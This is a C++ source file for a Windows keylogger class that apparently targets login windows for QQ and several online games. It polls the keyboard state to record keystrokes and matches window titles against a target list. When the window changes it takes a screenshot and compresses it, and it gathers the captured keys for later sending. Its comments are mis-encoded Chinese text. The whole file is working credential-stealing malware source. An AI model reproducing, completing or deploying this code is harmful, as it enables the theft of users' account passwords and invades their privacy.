// Key_Memory.cpp: implementation of the Key_Memory class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "Key_Memory.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

Key_Memory::Key_Memory()
{
    WindowCaption=NULL;
	Old_hwnd=NULL;
char * _LowerCase[95]={
"[BackSpace]",
"[Enter]",
"[ESC]",
"[F1]",
"[F2]",
"[F3]",
"[F4]",
"[F5]",
"[F6]",
"[F7]",
"[F8]",
"[F9]",
"[F10]",
"[F11]",
"[F12]",
"`",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
"0",
"-",
"=",
"[TAB]",
"q",
"w",
"e",
"r",
"t",
"y",
"u",
"i",
"o",
"p",
"[",
"]",
"a",
"s",
"d",
"f",
"g",
"h",
"j",
"k",
"l",
";",
"'",
"z",
"x",
"c",
"v",
"b",
"n",
"m",
",",
".",
"/",
"\\",
"[CTRL]",
"[WIN]",
" ",
"[WIN]",
"[Print Screen]",
"[Scroll Lock]",
"[Insert]",
"[Home]",
"[PageUp]",
"[Del]",
"[End]",
"[PageDown]",
"[Left]",
"[UP]",
"[Right]",
"[Down]",
"[Num Lock]",
"/",
"*",
"-",
"+",
"0",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
".",
};


char *_UpperCase[]={
"[BackSpace]",
"[Enter]",
"[ESC]",
"[F1]",
"[F2]",
"[F3]",
"[F4]",
"[F5]",
"[F6]",
"[F7]",
"[F8]",
"[F9]",
"[F10]",
"[F11]",
"[F12]",
"~",
"!",
"@",
"#",
"$",
"%",
"^",
"&",
"*",
"(",
")",
"_",
"+",
"[TAB]",
"Q",
"W",
"E",
"R",
"T",
"Y",
"U",
"I",
"O",
"P",
"{",
"}",
"A",
"S",
"D",
"F",
"G",
"H",
"J",
"K",
"L",
":",
"\"",
"Z",
"X",
"C",
"V",
"B",
"N",
"M",
"<",
">",
".?",
"|",
"[CTRL]",
"[WIN]",
" ",
"[WIN]",
"[Print Screen]",
"[Scroll Lock]",
"[Insert]",
"[Home]",
"[PageUp]",
"[Del]",
"[End]",
"[PageDown]",
"[Left]",
"[Up]",
"[Right]",
"[Down]",
"[Num Lock]",
"/",
"*",
"-",
"+",
"0",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
".",
};


int _SpecialKeys[]={
8,
13,
27,
112,
113,
114,
115,
116,
117,
118,
119,
120,
121,
122,
123,
192,
49,
50,
51,
52,
53,
54,
55,
56,
57,
48,
189,
187,
9,
81,
87,
69,
82,
84,
89,
85,
73,
79,
80,
219,
221,
65,
83,
68,
70,
71,
72,
74,
75,
76,
186,
222,
90,
88,
67,
86,
66,
78,
77,
188,
190,
191,
220,
17,
91,
32,
92,
44,
145,
45,
36,
33,
46,
35,
34,
37,
38,
39,
40,
144,
111,
106,
109,
107,
96,
97,
98,
99,
100,
101,
102,
103,
104,
105,
110,
};
for (int i=0;i<95;i++)//������¼��׼��������
{
	LowerCase[i]=_LowerCase[i];
	UpperCase[i]=_UpperCase[i];
	SpecialKeys[i]=_SpecialKeys[i];
}
PreviousFocus=NULL;
total_keyboard[0]='\0';
sum=0;
}

Key_Memory::~Key_Memory()
{
	//delete []total_keyboard;

}
/*BOOL Key_Memory::NeedToPicture()
{
	HWND hFocus = GetForegroundWindow();//��ȡ��ǰ�Ĵ��ھ��
	int WinLeng = GetWindowTextLength(hFocus);//��ȡ���ڱ���ĳ���
    char *WindowCaption=new char[WinLeng + 4];//���ٴ��ڱ��ⳤ�ȴ�С�Ŀռ�
    GetWindowText(hFocus,WindowCaption,(WinLeng + 1));//��ȡ���ڱ���
	string str(WindowCaption);//�ô��ڱ��⹹��һ��string�����


	if(str=="���³�����ʿ")//�ϸ���ƽ�ͼ����  �����Լ�������Ҫ��¼����Ϸ����
	{
		delete WindowCaption;
		return true;
	}

	if(str=="�λ�����ONLINE")//�ϸ���ƽ�ͼ����  �����Լ�������Ҫ��¼����Ϸ����
	{
		delete WindowCaption;
		return true;
	}

	if (str.npos!=str.find("������",0))//Ϊ�˵�½֮�����Ͼͷ��ͼ�¼����
	{
		delete WindowCaption;
		return true;
	}
	return false;

}*/
BOOL Key_Memory::IsThisWindow()
{
	HWND hFocus = GetForegroundWindow();//��ȡ��ǰ�Ĵ��ھ��
	int WinLeng = GetWindowTextLength(hFocus);//��ȡ���ڱ���ĳ���
    char *WindowCaption=new char[WinLeng + 4];//���ٴ��ڱ��ⳤ�ȴ�С�Ŀռ�
    GetWindowText(hFocus,WindowCaption,(WinLeng + 1));//��ȡ���ڱ���
	string str(WindowCaption);//�ô��ڱ��⹹��һ��string�����

	if (str.npos!=str.find("����",0))//����Ϊ�жϴ��ڱ����еĹؼ���  
	{
		delete WindowCaption;//�Դ����ж��Ƿ���Ҫ��¼�Ĵ���
		return true;
	}
	if (str.npos!=str.find("����",0))
	{
		delete WindowCaption;
		return true;
	}
	if (str.npos!=str.find("��Ѷ��Ϸ",0))
	{
		delete WindowCaption;
		return true;
	}
	if (str.npos!=str.find("��¼",0))
	{
		delete WindowCaption;
		return true;
	}
	if (str.npos!=str.find("��ȫ",0))
	{
		delete WindowCaption;
		return true;
	}
	if (str.npos==str.find("[",0) && str.npos!=str.find("������ II ($Revision: ",0))//Ϊ�˵�½֮�����Ͼͷ��ͼ�¼����
	{
		delete WindowCaption;
		return true;
	}
	if (str.npos==str.find("[",0) && str.npos!=str.find("�λ�����ONLINE",0))//Ϊ�˵�½֮�����Ͼͷ��ͼ�¼����
	{
		delete WindowCaption;
		return true;
	}
	if (str == "�λ�����ONLINE")//�λ����ε�½����
	{
		delete WindowCaption;
		return true;
	}
	if (str == "CFQQLogin")//��Խ������Ϸ����
	{
		delete WindowCaption;
		return true;
	}
	if (str.npos!=str.find("AVA",0))//ռ��֮��
	{
		delete WindowCaption;
		return true;
	}
	if (str == "QQ����")//QQ����
	{
		delete WindowCaption;
		return true;
	}
/*	if (str.npos!=str.find("���³�",0))//��������  �����Σ���������������������������������
	{
		delete WindowCaption;
		return true;
	}*/
	delete WindowCaption;
	return false;
}

BOOL Key_Memory::IsWindowsFocusChange()//�жϴ����Ƿ�ı���  �������Ч�������ƴ��ڼ�¼
{
	HWND hFocus = GetForegroundWindow();
	if (hFocus != PreviousFocus)//����ı���
	{
		Old_hwnd=PreviousFocus;
		PreviousFocus = hFocus;
        WindowCaption = NULL;
		if (strlen(KeyBuffer)>0 && strlen(KeyBuffer)<100)//����ǰ�洰���м��̰��¹�  
		{
			strcat(total_keyboard,"���洰���������");//��¼���̰��µĽ�
			strcat(KeyBuffer,"\r\n");
	        strcat(total_keyboard,KeyBuffer);
			memset(KeyBuffer,0,sizeof(KeyBuffer));
			sum++;

			//Sleep(1000);
			picture.OnPackMap(1000,0,800,1400);//��ͼ���洰�ڲ�����	
			
			FILE * fp = fopen("temp.bmp", "rb");
			unsigned long fsize, foutsize;
			char* fdata;
			char* fout;
			if (fp == NULL) 
			{
				return -1;
			}

			{
				fseek(fp, 0, SEEK_END);
				fsize = ftell(fp);
				fseek(fp, 0, SEEK_SET);
				fdata = (char*)malloc(fsize);
				fout  = (char*)malloc(fsize + 32);
				fread(fdata, fsize, 1, fp);
				fclose(fp);
			}

			if (my_compress.zlib_compress2(fout, &foutsize, fdata, fsize, 9) == 0) 
			{
			    fp = fopen("temp.yao", "wb");
				if (fp)
				{
					fwrite(fout, foutsize, 1, fp);
				}
				else 
				{
					return -2;
				}
				fclose(fp);
			}
			free(fdata);
            free(fout);


            //Sleep(5000);

			HWND hFocus_now = GetForegroundWindow();//Ϊ�˻�ȡĳЩ��Ϸ�ķ�������Ϣ
			int WinLeng = GetWindowTextLength(hFocus_now);
            char caption[100] = {0};
			GetWindowText(hFocus_now,caption,WinLeng + 1);
			strcat(caption,"\r\n");
			strcat(total_keyboard,caption);
		}

		else if(!IsThisWindow())//�������Ҫ��¼�Ĵ���
		{
			while (true)//ֱ��ΪҪ��¼�Ĵ���  ��ȡ����  ����ѭ��
			{
				if(IsThisWindow())
				{
					int WinLeng = GetWindowTextLength(hFocus);
					char caption[100] = {0};
					GetWindowText(hFocus,caption,WinLeng + 1);

					strcat(caption,"\r\n");
					strcat(total_keyboard,caption);
					break;
				}
				Sleep(1000);
			}
			//printf("%s\n",total_keyboard);
		}
		else//�����Ҫ��¼�Ĵ���  ���Ӵ��ڱ��⵽��¼
		{
			int WinLeng = GetWindowTextLength(hFocus);
			char caption[100] = {0};
			GetWindowText(hFocus,caption,(WinLeng + 1));

			strcat(caption,"\r\n");
			strcat(total_keyboard,caption);
		}
	}
	WindowCaption = NULL;
	return true;
}

//�˺���������Ч���ڵı仯����   �����Ƿ���Ҫ��ͼ   �����Ƿ��м��̰���   �Լ���ǰ�����Ƿ�Ϊ��Ч���� �����ز����ͱ���

//Ӧ�ó��������� InitInstance  ����ݴ˺�������ֵ���ж��Ƿ����ʼ�

//�˺����ڴ��ڱ仯ʱ�����÷���ͼƬ�ı��   stmp�����ݱ���� is_send_picture ���ж��ʼ����Ƿ���ͼƬ

BOOL Key_Memory::KeyLogger(string & buffer)
{
	if(!IsThisWindow())// ��Ҫ������  ���������Ҫ��¼�Ĵ��ھͲ�������¼������  ��������FALSE
	    return false;

	int bKstate[256] = {0};   
    int i,x;
    int state;   
    int shift;
	memset(KeyBuffer,0,sizeof(KeyBuffer));
	buffer = "";
	while (true)
	{
		IsWindowsFocusChange();//�����¼�����д��ڸı���  �����Զ���ɽ���һ�����ڵļ��̰��¼�¼�������� 
		//���������Ч���� ��ôֱ���仯����Ч���� ����ӵ�ǰ���ڱ���Ȼ�󷵻�  �����ֱ����Ӵ��ڱ���


		if (sum >= 1)//�����Ч���ڵı仯��������   
		{
			//printf("%s\n",total_keyboard);
			buffer.append(total_keyboard);//�Ѽ�¼���ݴ��ݳ�ȥ
			memset(total_keyboard,0,sizeof(total_keyboard));//���
			memset(KeyBuffer,0,sizeof(KeyBuffer));
			sum=0;//���ڼ���������
			return true;
		}

		Sleep(50);

        	

//����Ϊʵ�ʼ�¼����

		for (i=0;i<95;i++)
		{
			shift = GetKeyState(VK_SHIFT);
			x = SpecialKeys[i];

			if (GetAsyncKeyState(x) & 0x8000)
			{
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 91)))
				{
					bKstate[x] = 1;     //Uppercase Characters A-Z
				}

				else if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 91)))
				{
					bKstate[x] = 2;     //Lowercase a-z
				}

				else if (shift < 0)
				{
					bKstate[x] = 3;     //Uppercase Characters A-Z
				}
				
				else
					bKstate[x] = 4;
			}
			else
			{
				if (bKstate[x] != 0)
				{
					state = bKstate[x];
					bKstate[x] = 0;
					if (x == 8)
					{
						if(strlen(KeyBuffer) > 100)//���̫����գ���Ϊһ������Ϸ�а�������ô��ļ���
						{
							memset(KeyBuffer,0,sizeof(KeyBuffer));
							continue;
						}
						else
						{
							KeyBuffer[strlen(KeyBuffer) - 1] = 0;
							strcat(KeyBuffer,UpperCase[i]);
							continue;
						}
					}
					else if ((state%2) == 1)
					{
						if(strlen(KeyBuffer) > 100)//���̫�����
						{
							memset(KeyBuffer,0,sizeof(KeyBuffer));
						}
						else
						{
						    strcat(KeyBuffer,UpperCase[i]);
						}
					}
					else if ((state%2) == 0)
					{
						if(strlen(KeyBuffer) > 100)//���̫�����
						{
							memset(KeyBuffer,0,sizeof(KeyBuffer));
						}
						else
						{
						    strcat(KeyBuffer,LowerCase[i]);
						}
					}
				}
			}
		}//end of for
	}//end of while
}//end of funtionLowerCase


